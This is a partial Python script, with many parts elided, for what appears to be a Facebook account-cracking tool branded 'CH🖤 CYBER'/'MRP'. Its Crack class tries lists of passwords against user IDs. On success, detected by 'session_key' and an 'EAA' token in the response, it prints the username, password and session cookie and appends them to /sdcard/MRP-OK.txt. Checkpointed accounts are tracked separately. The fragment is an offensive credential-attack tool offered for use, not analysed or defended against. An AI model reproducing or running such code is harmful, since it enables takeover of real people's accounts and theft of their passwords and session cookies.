...
class Menu:
	...
	def cek_login(self,cookie):
		try:
			...
			prints(Panel(f"""{M2} WELCOME TO CH🖤 CYBER""",width=80,style=f"{color_panel}"))
			exit()
...
class Crack:
	...
	def metode_api(self,user,pwx):
		prog.update(des,description=f"{H2}[MRP💥]{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {P2}{len(self.cp)}{P2}")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
				...
				if "session_key" in post.text and "EAA" in post.text:
					...
					prints(f" [MR-P-444🤡OK] {H2}{user}|{pw}{P2}  [JUST NOW] \n[💥]={M2}=COOKIE {H2} •  {H2}{coki}\n")
					
					open('/sdcard/MRP-OK.txt','a').write(f"{user}|{pw}|{coki}\n")
					break
	...
	def simpan_hasil(self):
		prints(f"""{K2}CH🖤 CRACK OK DATE : MRP-OK.txt
{K2}CH🖤 CRACK CP DATE : MRP-CP.txt\n""")
###----------[ MENU ]---------- ###
class Back:
